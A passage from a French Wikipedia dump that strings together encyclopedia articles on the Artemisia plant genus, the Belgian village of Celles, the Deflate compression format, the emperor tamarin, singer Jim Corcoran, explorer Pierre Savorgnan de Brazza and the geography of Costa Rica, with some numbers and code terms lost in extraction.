Le genre Artemisia (les armoises) regroupe des plantes herbacées, des arbrisseaux et des arbustes, généralement aromatiques, densément tomenteux, pubescents ou glabres, de la famille des Astéracées. Leurs feuilles sont pennées (rarement palmées). L’armoise a notamment des propriétés diurétiques et l’artémisinine que l'on extrait de certaines espèces, en particulier d’"Artemisia annua", a plusieurs applications en médecine.
Certaines espèces d'armoises, comme l'Armoise commune ou l'Armoise annuelle, émettent un pollen pouvant provoquer des allergies chez les personnes sensibles.
Il ne faut pas confondre ces plantes avec l'ambroisie à feuilles d'armoise ("Ambrosia artemisiifolia" L.) qui est connue pour être la cause de redoutables allergies respiratoires.
Dénominations.
En chinois, elle est appelée "hao shu" (蒿属).
Utilisations.
Plusieurs espèces étaient utilisées depuis l'Antiquité et sont encore utilisées pour diverses propriétés thérapeutiques (l'armoise commune était autrefois dite « la mère des herbes » ou « la mère des simples » ; « Si tu connaissais les vertus de l'artémise, tu la porterais dedans ta chemise », disait-on), notamment "Artemisia annua" et "Artemisia afra" pour la lutte contre le paludisme. Il est important de noter que cette utilisation n'est cependant pas prouvée comme efficace et n'est donc pas recommandée. Certaines espèces aromatisent des alcools ou sont utilisées comme condiment.
En Europe, les espèces les plus utilisées pour l'alimentation et/ou les médecines traditionnelles sont l'absinthe, l'aurone (ou arquebuse), les génépis (armoises des montagnes), l'estragon, l'armoise annuelle.
Taxonomie.
Liste des espèces.
Selon :
Calendrier.
Le septième jour du mois de thermidor du calendrier républicain / "révolutionnaire" français est dénommé jour de l'armoise, généralement chaque "25 juillet" du calendrier grégorien.
Langage des fleurs.
Dans le langage des fleurs, l'armoise symbolise la fidélité conjugale et le bonheur.

</doc>
<doc id="248621" url="https://fr.wikipedia.org/wiki?curid=248621" title="Artemisia (plante)">
Artemisia (plante)



</doc>
<doc id="248622" url="https://fr.wikipedia.org/wiki?curid=248622" title="Celles (Namur)">
Celles (Namur)

Celles ou Celles-lez-Dinant (en wallon "Céle-dilé-Dinant") est une section et un village de la commune belge de Houyet situés en Wallonie dans la province de Namur. Le village est traversé par un petit affluent de la Lesse.
Étymologie.
Le nom de Celles trouve son origine dans le nom latin féminin "cella" signifiant " Chambre, local, pièce, salle" ou encore, "cellule".
Il provient, suivant la tradition, des cellules que les disciples de Hadelin de Celles (617-690) construisirent pour demeurer auprès de leur maître spirituel, l'ermite Hadelin.
Histoire.
Des traces de culte au dieu romain Neptune semblent indiquer que l'endroit est déjà habité au .
Au , la contrée est évangélisée par l'Aquitain saint Hadelin qui y fonde d'abord un ermitage, devenu ensuite un monastère. Plusieurs miracles sont attribués à l'intercession du saint. Le village devient alors un lieu de pèlerinages.
En l'an 1046, l'évêque de Liège Wazon fait déposer les restes du saint dans une châsse ornée de reliefs en argent. Les longs côtés sont parachevés vers 1170 pour en faire ce trésor de l'art mosan que l'on peut admirer en l'église Saint-Martin de Visé. D'abord conservée à Celles, la châsse est transférée à Visé en 1338.
Les bénédictins occupent le monastère jusqu'au , époque où ils sont remplacés par un chapitre de chanoines. Une chapelle occupe l'emplacement de l'ancien ermitage. L'église du village remonte au et domine la crypte du sanctuaire primitif édifié au . Voici donc bientôt ans que les moines ont décidé de construire cette collégiale qui n’a pratiquement pas été modifiée depuis. Véritable chef-d’œuvre de l’art roman en Belgique, l'Église Saint-Hadelin est reprise au patrimoine majeur de Wallonie.
Durant la Seconde Guerre mondiale, le village fut le point ultime de l'avancée allemande lors de l'offensive de la bataille des Ardennes en décembre 1944. Une patrouille allemande ayant revêtu des uniformes américains a cependant atteint la ville proche de Dinant.
Celles était une commune à part entière avant la fusion des communes de 1977.

</doc>
<doc id="248623" url="https://fr.wikipedia.org/wiki?curid=248623" title="Deflate">
Deflate

Deflate est un format de compression de données sans perte qui couple l'algorithme LZ77 et le codage de Huffman. Il fut défini à l'origine par Phil Katz pour la version 2 de son archiveur PKZIP, et fut plus tard défini dans la RFC 1951 en 1996, par Jean-Loup Gailly et Mark Adler.
Deflate n'est soumis à aucun brevet, ce qui a conduit à son utilisation dans les formats gzip et PNG, en plus du format zip auquel il était au départ destiné, à l'époque où le brevet sur l'algorithme LZW (utilisé dans le format GIF) n'avait pas encore expiré.
codice_1 désigne aussi une méthode d' (aux côtés de gzip ou br), le format de fichier utilisé est alors celui de zlib (RFC 1950).
Détails.
Structure par blocs.
Deflate prescrit une structure par blocs de données dont les trois premiers bits donnent le type.
Le premier bit est codice_2 si le bloc est le dernier bloc du fichier, et codice_3 sinon.
Les deux bits suivants indiquent comment les données sont encodées, selon trois types possibles indiqués pas les marqueurs codice_4, codice_5 et codice_6. Le marqueur codice_7 n'est pas utilisé.
Les blocs compressés n'ont pas de limite de taille : un caractère de l'alphabet donne un signal de fin de bloc. Un fichier contenant un seul bloc compressé contenant tout le fichier source est donc possible.
Bloc non compressé.
Ce bloc contient les données brutes qui seront recopiées directement dans le fichier décompressé.
Ce bloc est indiqué par le marqueur codice_4 et contient dans ses deux premiers octets un entier non signé sur 16 bits donnant la longueur codice_9 du bloc, et dans les deux suivants le complément à un de cet entier. Les codice_9 octets suivants forment le bloc.
La longueur de ce type de bloc est donc limitée à 64 Kio (limite d'un entier non signé sur 16 bits).
Blocs compressés.
Les données sont considérées par octet et d'abord compressées avec l'algorithme LZ77 : les caractères désignent soit un octet brut soit une référence à des données déjà existantes précédemment dans le fichier. Cette référence est sous la forme d'un couple codice_11 où la distance est inférieure à codice_12 octets (soit 32 Kio) et la longueur dans l'intervalle d'entiers codice_13. Ces bornes permettent de définir deux alphabets sur lesquels l'encodage par arbres de Huffman a lieu.
Code de Huffman standard.
Le marqueur codice_5 indique un bloc encodé par un arbre de Huffman standard défini dans la RFC 1951.
On considère deux alphabets : d'une part les entiers codice_3 à codice_16, et un autre alphabet contenant les entiers de codice_3 à codice_18. Les alphabets des octets bruts et des longueurs sont fusionnés dans le premier alphabet. Cela veut dire que pour un octet brut est attribué directement le code qui correspond à sa valeur en entier de codice_3 à codice_20, le code codice_21 correspond à la fin du bloc et les codes suivants correspondent à des longueurs, par exemple codice_22 pour une longueur de 3. Pour certains codes la longueur n'est pas unique, c'est pour cela qu'on utilise des bits supplémentaires pour la déterminer. Par exemple, pour coder la longueur 25 est utilisé codice_23 à qui on ajoute deux bits, ici codice_6 codant le chiffre 2 car formula_1. De même pour la distance, on lui attribue un code qui correspond à la tranche à laquelle elle appartient, puis on utilise éventuellement des bits supplémentaires pour coder sa valeur. Le nombre de bits supplémentaires attendu est spécifié dans la section 3.2.5.
Une fois cette première étape passée, on modifie les codes précédemment obtenus en code de Huffman. Pour les codes correspondant aux octets bruts et aux longueurs, on leur attribue un code allant de 7 à 9 bits, puis on ajoute les éventuels bits supplémentaires. Par exemple, le code codice_23 sera représenté par codice_26 (7 bits) alors que le code codice_27 sera représenté par codice_28 (8 bits), cela permet de minimiser le nombre de bits utilisés pour les codes les plus fréquents. On remarquera que les codes codice_29 et codice_30 ont une attribution de code de Huffman, bien que ces codes ne figureront jamais dans les données compressées. Pour la distance, on utilise comme code de Huffman le code précédemment obtenu concaténé avec les éventuels bits supplémentaires. On peut alors juxtaposer le code de Huffman de la longueur, ses éventuels bits supplémentaires puis celui de la distance avec ses bits supplémentaires, on obtient alors le code compressé du couple codice_11 .
Code de Huffman adapté.
Le marqueur codice_6 indique un bloc encodé par un arbre de Huffman fourni dans le fichier, qui est lui même encodé suivant un format prescrit par Deflate. Ce type de bloc est désigné pour l'utilisation de codage Huffman adaptatif lors de la compression, ce qui permet d'avoir un encodage adapté à sa source.
Limitations.
Deflate ne définit qu'un format de données compressées. Ce n'est en particulier pas un format de fichier : il est ainsi recommandé dans la section 6 de coupler les données Deflate avec un code correcteur d'erreurs pour former une archive, comme c'est le cas pour gzip.
Deflate64.
Il s'agit d'une variante de Deflate qui utilise un dictionnaire plus grand (64 ko au lieu de 32 ko), des codes longueurs de 16 bits (pour des longueurs de 3 à 65536 octets), et des codes distances de 14 bits (30-31). Le taux de compression est légèrement amélioré en comparaison avec Deflate.
PKZIP prend en charge Deflate64 à partir de la version 2.50. Ce format a été créé par PKWARE et est inclus dans la spécification ZIP (méthode de compression 9), bien qu'il ne soit pas décrit en détail et soit considéré comme un format propriétaire par PKWARE (qui revendique Deflate64 comme marque de commerce).
Deflate64 est pris en charge par plusieurs produits (7-zip, Info-ZIP) mais pas par zlib, en raison de son aspect propriétaire et des faibles améliorations qu'il apporte.

</doc>
<doc id="248625" url="https://fr.wikipedia.org/wiki?curid=248625" title="Tamarin labié">
Tamarin labié

Le Tamarin labié (Saguinus labiatus) est une espèce de primate de la famille des Callitrichidae vivant en Amérique du Sud.
Description.
Le Tamarin labié a le manteau et la nuque d'apparence sombre. L'arrière-corps est suffusé de gris argenté et le dessous est d’un rouge brillant. La queue est complètement noire sauf au-dessous de la base roux ou orangé. Les lèvres et le nez sont couverts de poils blancs qui se détachent sur la face noire. Une raie pâle parcourt également le bas de l’oreille.
Distribution.
Cette espèce se rencontre dans le Centre-Nord-Ouest et dans le Nord-Ouest du Brésil, on la retrouve également dans l'extrême Sud-Est du Pérou et dans l'extrême nord de la Bolivie.
Sous-espèces.
Le tamarin labié comprend trois sous-espèces :
Habitat.
Cette espèce vit dans les forêts pluviales primaires et secondaires, dans les forêts semi-décidues, les forêts marécageuses et également les forêts inondables.
Comportements divers.
En captivité, il joue fréquemment (pourchassement sur les troncs et les branches, parties de catch au sol) mais l’activité ludique des jeunes tamarins dans la nature s’avère limitée par la nécessité de longs déplacements quotidiens et l’apprentissage des nombreuses pratiques sociales indispensables à leur survie tel que la capture des insectes.
Activités.
Il parcourt chaque jour environ et se déplace principalement dans les strates basse et moyenne comprises entre et . Il reste cependant quasiment toujours au-dessus de du sol.
Alimentation.
Le tamarin labié est frugivore, insectivore et exsudativore. Il privilégie les fruits mûrs sucrés et pulpeux (surtout entre mars et mai). Il consomme de petits insectes qu’il déniche sur les feuilles et les ramilles. Ce primate furtif chasse par surprise.
Reproduction.
Le pic des naissances se situe entre octobre et décembre. Les jumeaux viennent au monde après 140 à 150 jours de gestation et sont élevés par l’ensemble du groupe.

</doc>
<doc id="248626" url="https://fr.wikipedia.org/wiki?curid=248626" title="Saguinus labiatus">
Saguinus labiatus



</doc>
<doc id="248629" url="https://fr.wikipedia.org/wiki?curid=248629" title="Callimico">
Callimico



</doc>
<doc id="248630" url="https://fr.wikipedia.org/wiki?curid=248630" title="Callithrix">
Callithrix



</doc>
<doc id="248635" url="https://fr.wikipedia.org/wiki?curid=248635" title="Jim Corcoran">
Jim Corcoran

Jim Corcoran, né en 1949 à Sherbrooke au Québec (Canada), est un auteur-compositeur-interprète québécois.
D'abord connu pour son travail folk avec Bertrand Gosselin dans le duo Jim et Bertrand, il a réorienté sa carrière au début des années 1980 pour devenir un artiste majeur sur la scène musicale au Québec.
Parallèlement à sa carrière musicale, Corcoran anime aussi des séries d'émissions à CBC Radio One, la radio anglaise de la Société Radio-Canada où il présente le Québec et sa culture à un auditoire canadien anglophone.
Au cours des années 2000, il réalise des collaborations avec le Cirque du Soleil. Bien que sa langue maternelle soit l'anglais, il chante régulièrement en français.
Biographie.
Né à Sherbrooke le , il complète des études à l'Université Bishop en français et en philosophie et pratique la guitare pendant ses heures de loisirs.
Jim et Bertrand.
En 1972, il forme le duo Jim et Bertrand avec Bertrand Gosselin et commence à se produire dans les Cantons de l'Est. Pendant les années 1970, ce groupe est associé à la chanson folk québécoise.
À la dissolution du groupe en 1979, il entame une carrière solo dans le monde francophone. Le parcours de Jim Corcoran connaît toutefois une véritable ascension au milieu des années 1980.
En 1980, son album "Têtu" se fraye un chemin à travers les palmarès québécois pour remporter le Félix de l'Album folk de l'année 1981
En 1983, il lance l'album "Plaisirs", qui rencontre à son tour une bonne réception.
En , alors qu'il a 56 ans, Jim Corcoran lance aussi l'album "Pages Blanches".
Nouvelle carrière.
En , il devient animateur de l'émission "À propos" à CBC Radio One, la chaîne de radio anglophone de la Société Radio-Canada. Il participe également à la pièce de théâtre "Nelligan".
Changement de son.
En 1990, il reçoit un prix Félix de l'ADISQ pour la réalisation du disque "Corcoran". En 1996, l'ADISQ lui décerne un autre prix Félix pour l'album de l'année, catégorie Folklore, .
Collaboration avec le Cirque du Soleil.
Corcoran collabore à l’écriture de paroles pour la musique de trois spectacles du Cirque du Soleil : "Quidam", "Kà" et "Wintuk". La pièce « Let Me Fall », écrite avec Benoît Jutras pour "Quidam", a été popularisée par Josh Groban.

</doc>
<doc id="248641" url="https://fr.wikipedia.org/wiki?curid=248641" title="Olympos">
Olympos

Olympos peut faire référence à :

</doc>
<doc id="248644" url="https://fr.wikipedia.org/wiki?curid=248644" title="Mesembryanthemaceae">
Mesembryanthemaceae



</doc>
<doc id="248649" url="https://fr.wikipedia.org/wiki?curid=248649" title="Pierre Savorgnan de Brazza">
Pierre Savorgnan de Brazza

Pierre Savorgnan de Brazza, né le à Rome et mort le à Dakar, est une figure majeure de l'exploration et de la colonisation française en Afrique centrale. D'origine italienne, naturalisé français, il est connu pour ses expéditions dans le bassin du Congo et pour son rôle dans la fondation du Congo français.
Issu de l'aristocratie romaine, il est attiré très tôt par l'aventure et l'exploration. Après avoir servi dans la marine française, il se tourne vers l'Afrique centrale, fasciné par les récits des grands explorateurs. Ses expéditions, menées dans un esprit de pacification et de négociation avec les populations locales, lui permettent de remonter le fleuve Congo et de nouer des relations privilégiées avec les tribus. En 1880, il fonde Brazzaville, qui devient rapidement le centre administratif de la colonie française du Congo. Son approche humanitaire et sa volonté de préserver les cultures locales le distinguent de ses contemporains, notamment de Henry Morton Stanley, qui prônait une colonisation plus brutale.
Biographie.
Jeunesse.
Élevé à Rome, sous le nom de Pietro di Brazzà, il est le des treize enfants de Giacinta Simonetti, aristocrate romaine, et du comte Ascanio Savorgnan di Brazzà, un noble d’Udine, issu des Savorgnan, famille patricienne de la république de Venise. Cet homme cultivé et voyageur avait de nombreux amis français, dont l'amiral Louis de Montaignac, ministre de la marine. Avec son soutien et celui de son précepteur, Pietro vient à Paris et suit les cours du collège Sainte-Geneviève pour préparer le concours d’entrée à l’École navale de Brest. Il y entre à , en sort enseigne de vaisseau et embarque sur la "Jeanne d’Arc" pour l’Algérie. Là-bas, il est horrifié par la violence de la répression de la révolte kabyle par les troupes françaises, ce qui le conduira à agir différemment devant les indigènes du Congo pendant ses expéditions futures. La guerre de 1870 est alors déclarée : bien qu'étranger, il veut être affecté dans une unité combattante et se retrouve sur le cuirassé "la Revanche", dans l’une des escadres de la mer du Nord.
Famille.
Mariage et descendance.
Le , Pierre de Brazza épouse Thérèse Pineton de Chambrun (1860-1948 Alger), fille de Charles-Antoine de Chambrun et de Marie-Henriette Tircuy de Corcelle, et descendante de La Fayette. Le mariage est célébré dans la chapelle privée de l’hôtel du comte de Chambrun, rue Monsieur à Paris. Le couple aura quatre enfants : Jacques, né en 1899, décédé quatre ans plus tard d’une crise d’appendicite, Antoine, agriculteur (1900-1947), Charles, artiste peintre (1901-1962) et Marthe, autrice d'une biographie (1903-1949).
La fille adoptive de Savorgnan de Brazza.
Au début de sa première grande expédition de 1875-78 vers les sources de l'Ogooué, Brazza et sa petite troupe croisent une bande de guerriers Osyébas marchands d'esclaves. Brazza achète l'ensemble de leurs captifs et, déployant le drapeau tricolore, affranchit sur-le-champ ces infortunés au nom de la liberté que la France reconnaît à tout homme. Parmi eux, l'Adouma Otulu choisit de se joindre à son convoi avec sa femme Aniassa et leur fille Antini âgée de sept ou huit ans. Otulu meurt peu après, attaqué et broyé par un gorille mâle furieux ; plus tard trépasse Aniassa, mordue par une vipère gabonaise au venin fatal. Fidèle à la promesse faite aux parents à l'agonie, Brazza adopte l'orpheline, qui l'accompagnera pendant toute l'expédition, se révélant d'ailleurs précieuse par sa connaissance de langues et d'usages locaux et son intelligence éveillée. A son retour en 1878, Brazza confie l'éducation de la fillette aux Sœurs de Sainte-Marie à Libreville.
Deux ans plus tard, Antini demande à être baptisée et choisit le prénom Hyacinthe de sa grand-mère adoptive, avec laquelle elle entretient déjà une correspondance. En 1890, elle prononce ses vœux : Sœur Hyacinthe devient la première Sœur Bleue née de parents africains. Elle meurt le 16 juin 1952 après une vie consacrée à sa vocation de religieuse missionnaire dans l'intérieur du Gabon, à Donghila puis à la Lagune Fernan Vaz.
Honneurs.
Le 11 février 1883, il est nommé lieutenant de vaisseau et commissaire général de la République dans l'Ouest-Africain.
En 1888, il est initié en franc-maçonnerie dans la Loge « Alsace-Lorraine » du Grand Orient de France à Paris. Mais, en 1904, il donne sa démission en invoquant les responsabilités de la franc-maçonnerie dans la gestion de la colonie de l'Afrique-Équatoriale française.
Missions exploratrices.
Première expédition 1875-1878.
Avec l’avènement de la République, sa deuxième affectation dans la marine française est la frégate "Vénus", qui faisait régulièrement escale au Gabon. En 1874, Brazza remonte deux fois le fleuve Ogooué. Il propose ensuite au gouvernement d’explorer l’Ogooué jusqu’à sa source, afin de démontrer que ce fleuve et le Congo ne font qu’un. Avec l’aide de relations bien placées, comme Jules Ferry et Léon Gambetta, il obtient des subsides, qu’il n’hésite pas à compléter avec ses propres ressources (selon les documents, la famille de Brazza a contribué aux deux premières expéditions de l'explorateur avec une somme d'un million de francs, et le gouvernement français n'a donné que francs). À la même époque, sa demande de naturalisation aboutit enfin et il adopte la francisation de son nom. Il doit cependant revenir quelques mois à Paris pour passer son diplôme de capitaine, ses grades acquis en tant qu'étranger ne comptant plus, afin de demeurer dans la Marine nationale et y poursuivre son dessein.
Pour cette expédition, qui dure de 1875 à 1878, il se munit de toiles de coton et d’outils pour le troc. Il est seulement accompagné d’un médecin, Noel Ballay, d’un naturaliste, Alfred Marche, son assistant, Victor Hamon, et d’une douzaine de fantassins sénégalais. Brazza s’enfonce dans l’intérieur des terres et réussit à nouer de bonnes relations avec la population locale, grâce à son charme et son bagout. Ayant atteint les rives de l'Alima, en pays Téké, il subit l'attaque des Bafourou et doit faire demi-tour. Son expédition n'est toutefois qu'un échec relatif du point de vue de son but d'origine, mais une réussite d'exploration, car il a démontré que les deux fleuves sont différents. En tout état de cause, le , Brazza et ses compagnons d’exploration, fatigués et malades, décident de faire demi-tour.
Deuxième expédition 1879-1882, fondation de Brazzaville.
Sous l’impulsion du ministre de l’Instruction publique, Jules Ferry, le gouvernement français autorise alors une deuxième mission (1879-1882) en collaboration avec Antoine Mizon, pour faire pièce aux visées coloniales belges sur le continent africain. Financée par la Société française de géographie ainsi que par les ministères de la Marine, des Affaires étrangères et de l’Instruction publique représentés par François Paul de Dufourcq, officier de marine et délégué du ministère de l'Instruction publique, la deuxième mission est nettement plus fructueuse. Parti le , en compagnie notamment de Jean-Noël Savelli, Brazza atteint le fleuve Congo en 1880. Il propose à Illoy, Makoko de Mbé, chef des Téké de Mbé, de placer « son pays » sous la protection de la France. Ce chef, poussé par des intérêts commerciaux et par la possibilité d’affaiblir ses rivaux, signe le traité à Nkuna. Brazza obtint ainsi la concession d'un territoire à M'foa sur la rive droite du fleuve Congo ; site qui sera appelé Brazzaville en 1911. En tentant de rallier l’océan depuis Franceville, Brazza tombe par hasard sur le but premier de ses recherches : les sources de l'Ogooué.
Protectorat français au Congo.
De retour en France, il popularise ses découvertes grâce à de multiples réunions publiques et articles de presse. Le , la loi ratifiant le traité d’amitié, signé entre Illoy et Brazza, est promulguée. Les régions découvertes sont de fait placées sous protectorat français. Un mois plus tard, de nouveaux crédits sont votés pour une troisième expédition. La publication du compte-rendu des « Voyages dans l'Ouest Africain, 1875-1887 » (Le Tour du monde de 1887 et 1888) est accompagnée de nombreuses gravures réalisées d'après des dessins fondés sur les photographies prises par son frère, Jacques de Brazza, qui avait effectué une mission jusqu'en pays Téké, sur les rives de la Likouala en 1885. En , il est nommé commissaire général du Congo français. Des journalistes font état des salaires décents et des conditions humaines qui contrastaient avec le régime personnel de Léopold II sur l’autre rive du Congo. Mais son succès lui procure aussi des inimitiés et il est soumis à une intense campagne de dénigrement.
Oppositions rencontrées par Brazza.
En France.
En 1897, Brazza s’oppose à la décision du ministre des Colonies, André Lebon, de soumettre les territoires qu’il a gagnés à la France au régime de la concession, déjà en vigueur au Congo belge, et qui livrerait les populations à la cupidité des sociétés capitalistes privées chargées de « mettre en valeur » ce territoire de km² composé du Gabon, du Congo et de l’Oubangui-Chari.
En , touché par un « dégagement des cadres », Brazza est écarté de la marine nationale et placé à la retraite d'office. Marchand et ses officiers (Baratier, Mangin, Largeau fils, futur fondateur du Tchad, etc.) l’ont déclaré responsable du retard de la mission Congo-Nil. Marchand décrit la colonie du Congo français géré par Brazza comme un dirigé par des . Selon les documents, Brazza s’oppose à l’expédition Marchand à cause de la présence d’un grand nombre de soldats, ce qui témoignait de l’esprit de soumission des populations qui inspirait cette entreprise. Brazza proposait depuis six ans d’organiser une expédition avec le même parcours, pour ouvrir une voie de connexion entre le Congo et l’Afrique du nord. L’expédition Marchand ne s’arrêta pas devant l’opposition de Brazza, et termina avec le honteux épisode de Fachoda, qui a sérieusement affaibli la réputation internationale de la France et sa position en Afrique.
Victor Largeau, explorateur du Sahara et du Congo, administrateur de Loango et de ses dépendances sous les ordres de Brazza, fit dans ses correspondances un portrait peu flatteur de Brazza, le surnommant compte tenu de sa propension à circuler en hamac porté par des Noirs et de son absence de décision. (lettre du à son fils). De l’autre côté, Brazza accuse Largeau d’être corrompu par les agents commerciaux désireux de mettre en place un régime d’exploitation sans se préoccuper des droits des indigènes. Selon les documents, le manque d’organisation de la colonie était dû en partie au budget très limité.
Contre Stanley et Léopold II.
Partisan des palabres, farouchement opposé à la violence, Brazza garde comme modèle Livingstone et s’oppose en cela à Stanley, surnommé « Boula Matari » (« briseur de roches »). Léopold II tente de rallier le Français à sa cause pour ses territoires de la rive gauche du Congo ; Brazza refuse ses avances car les méthodes d'exploitation des indigènes des pays conquis ne lui convenaient pas. Léopold II se tourne alors vers Stanley, mercenaire de l'exploration. Stanley d’abord peu méfiant, voire admiratif à l'égard de Brazza, s’aperçoit trop tard qu’il a été trompé par le Français, qui ne l’informe pas du traité qu’il a signé avec le Makoko. La réputation de Stanley en souffre durablement, en France, où il est vertement critiqué, et en Angleterre, où sa naïveté est raillée. Un an après la signature du traité entre Brazza et le Makoko, le chef téké des tribus de la rive gauche, Ngaliema, signe le « traité de l’amitié » avec Stanley, ne se considérant plus soumis au Makoko de Mbé. Il place ainsi la rive droite du fleuve sous la protection de l’Association internationale africaine.
Troisième expédition.
Du 28 septembre 1897 au 28 avril 1900, Henri-Félix de Lamothe est Commissaire général du Congo français en remplacement de Savorgnan de Brazza mis à la retraite et retiré à Alger où le climat lui est plus favorable qu'à Paris. Le nouveau Commissaire instaure l'impôt de capitation dans le territoire, comme demandé par les sociétés concessionnaires. La rareté de la monnaie française au Congo français impliquait que cet impôt soit payable en nature.
Le territoire de l’Afrique équatoriale française est réparti entre une quarantaine de compagnies concessionnaires. Les sociétés qui se partagent l’exploitation de ces pays déciment les populations, soumises aux violences et aux brutalités : portage, travaux forcés, réquisitions et répression de toute tentative de résistance.L'affaire Toqué-Gaud rajoute à la situation désastreuse de la colonie. Le , à Fort-Crampel, en Oubangui-Chari, un administrateur des colonies, Georges Toqué, et un commis des affaires indigènes, Fernand Gaud, décident de faire exécuter Pakpa, ancien guide, en lui attachant de la dynamite autour du cou. Au procès, les accusés rappellent qu’ils ont déclaré avant cette action épouvantable : '. Gaud dira à son procès qu’il voulait faire constater autour de lui l’étrangeté de cette mort : ' (propos rapportés par Félicien Challaye, qui accompagna Brazza dans sa mission d’inspection).
En 1905, pour toutes ces raisons, le ministre des Colonies alors M. Clementel, demande à Brazza d’inspecter les conditions de vie dans les colonies. De cette mission, il tire un rapport baptisé le rapport Brazza, qui dénonce les influences de l'intérêt privé dans la politique coloniale et qui restera pendant longtemps inaccessible au public : il n'est rendu public qu'en 2014.
Fin de vie.
La santé de Brazza se détériore. Au retour de sa mission, atteint de fortes fièvres, il est contraint de débarquer à Dakar. Le , veillé par sa femme et par le capitaine Mangin, il meurt à six heures du soir. La photo de Jacques, son enfant de cinq ans, disparu deux ans auparavant, a été placée à sa demande sur sa table de nuit.
Quant à l’Assemblée nationale, elle s’empresse de mettre son embarrassant rapport sous l’éteignoir. Son corps est d’abord réclamé par le gouvernement français. La Troisième République cherche en effet ses nouveaux héros. Brazza, officier de marine aristocrate, élégant, héroïque, révolté par l’esclavagisme, apôtre de la paix, et surtout désintéressé, a un profil parfait à tous égards. Il est envisagé de l'inhumer au Panthéon pour récupérer sa gloire intacte. Thérèse refuse l’honneur. Son corps est alors inhumé au Père-Lachaise, puis déplacé, trois ans plus tard, à Alger, où vivent sa veuve et ses enfants. Sur sa tombe, l’épitaphe, rédigée par son ami Charles de Chavannes, indique que .
Affaires posthumes.
Après sa mort, sa femme Thérèse de Chambrun reçoit une petite rente du gouvernement français puis les revenus d'un débit de tabac après une importante campagne de presse.
La maison des Brazza, la villa Dar-es-Sangha à Alger, est donnée par Charles, dernier des enfants survivants, à l'initiative du général Aldebert de Chambrun, son oncle, au Gouverneur d'Algérie, pour devenir un musée qui est inauguré le lors des cérémonies du centenaire de la naissance de son père. La maison comprenait des meubles, des objets, une importante bibliothèque et d'innombrables documents.
Son fils Charles tente sans succès d'alerter les autorités françaises pour leur préservation à la fin de la guerre d'Algérie.
Malheureusement, après l'indépendance () ni le gouvernement algérien ni le gouvernement français ne prennent de mesure pour protéger le musée du pillage et de la destruction. En conséquence et à la suite de son agression, son fils Charles meurt en .
Un peu plus de cent ans après sa mort, après la signature d’un protocole spécial d’accord par le Président de la république du Congo Sassou Nguesso ainsi que par les descendants de Brazza, le les corps de l’explorateur français, de son épouse et de leurs quatre enfants, sont exhumés le , du cimetière chrétien des Brus, dans le quartier d’El Madania sur les hauteurs d’Alger, où ils reposaient, pour être transférés à Brazzaville.
Trois membres de la famille de l’explorateur, Niccolò di Brazzà, Roberto Pirzio-Biroli et Pietro di Serego Alighieri, ainsi qu’un membre de la famille de sa femme, Pierre-Antoine de Chambrun, assistent à l’exhumation des corps.
L’ambassadeur du Congo, Jean-Baptiste Dzangue et le consul de France en Algérie, Francis Heude, les ambassadeurs de France, Hubert Colin de Verdière, du Sénégal, Saïdou Nourou Ba, d’Italie, Battista Verderame et un représentant du ministère algérien des Affaires étrangères, étaient également présents. Le cercueil de Savorgnan de Brazza était recouvert du drapeau français.
Les restes sont ensuite embarqués à bord d’un avion cargo spécialement affrété par le Congo, à destination de Franceville puis de Brazzaville, où ils sont réinhumés le , en présence des présidents congolais, Denis Sassou-Nguesso, centrafricain, François Bozizé, et gabonais, Omar Bongo Ondimba, du ministre français des Affaires étrangères, Philippe Douste-Blazy et du successeur du roi Illoy qui avait signé le traité avec Brazza, Auguste Nguempio, accompagné par la cour royale. Les représentants des Teké ont été invités à la cérémonie à la demande de la plupart des descendants de l’explorateur, qui sont liés aux Teké par un lien de sang.

</doc>
<doc id="248650" url="https://fr.wikipedia.org/wiki?curid=248650" title="Géographie du Costa Rica">
Géographie du Costa Rica

Le Costa Rica est situé au centre de l'isthme d'Amérique centrale, à 8° de latitude nord et 84° de longitude ouest. Le pays est bordé à l'est-nord-est par la mer des Caraïbes, et au sud-ouest par l'océan Pacifique. Le Costa Rica compte km de côtes ( sur la mer des Caraïbes et le reste sur l'océan Pacifique).
Le Costa Rica compte de frontière commune avec le Nicaragua, au nord-nord-ouest, et de frontière avec le Panama au sud-est. En incluant sa superficie insulaire, la superficie du Costa Rica est de (50.560 km² de terres y 440 km² d'eau). 
Avec le Belize et le Salvador c'est l'un des états les plus petits d'Amérique centrale. 
Topographie.
Le Costa Rica est organisé topographiquement en trois grands secteurs : une succession de cordillères (cordillère volcanique de Guanacaste), cordillère volcanique centrale, et cordillère de Talamanca qui culmine à au Cerro Chirripó d'axe nord-ouest sud-est sépare les plaines lavées de la côte caraïbe de la côte pacifique accidentée.
La cordillère de Guanacaste et la Cordillère centrale comptent une multitude de volcans actifs et éteints. (Le Costa Rica compte 116 volcans, dont cinq sont encore en activité et placés sous surveillance). Le Rincón de la Vieja () avec de nombreuses mares de boue sur ses flancs, le Turrialba ()… Les trois plus visités sont le volcan Poás (), dont le cratère principal, occupé par un lac d'acide, est le plus large du monde ( de diamètre), l'Irazú () au lac d'acide vert, et l'Arenal (), actif depuis 1968, près duquel sont construits de nombreux hôtels et thermes. le Tenorio (), le Miravalles () sont considérés comme endormis.
Avec ses panoramas dignes des Alpes, le Costa Rica est surnommé la Suisse de l'Amérique latine.
Géologie.
Histoire géologique du Costa Rica.
L'histoire géologique a commencé près du Jurassique Inférieur-Supérieur, il y a 200 millions d'années. À cette époque, les masses continentales étaient probablement dans une position très similaire à celle d'aujourd'hui.
Le processus d'orogenèse a commencé par une activité volcanique, accompagnée de l'émergence de dorsales océaniques et de crêtes sous-marines. Ce processus a donné naissance à un arc d'îles orienté vers l'est, qui sera plus tard connu sous le nom d'arc externe, actuellement représenté par une série de chaînes de montagnes usées, situées sur la péninsule de Nicoya, Playa Herradura, la péninsule d'Osa et Punta Burica.
Démographie.
Dans la plaine élevée centrale ("Meseta Central") du secteur de la cordillère, le Costa Rica est densément peuplé avec San José, Alajuela, Cartago et Heredia, quelques-unes des plus grandes villes du pays. Puerto Limón, sur la côte des Caraïbes, est le port le plus important du pays. San José, la capitale, compte 2 millions d'habitants avec sa grande banlieue.
La côte pacifique est la plus ouverte au tourisme balnéaire avec de nombreuses stations prisées par les riches Californiens (Tamarindo, Puntarenas, Quepos) et par les surfeurs en quête de vagues sensationnelles ("Ollie's Point" et "Playa Grande" au nord de Tamarindo, "Jaco" et "Playa Hermosa" dans la région de Puntarenas).
Climat.
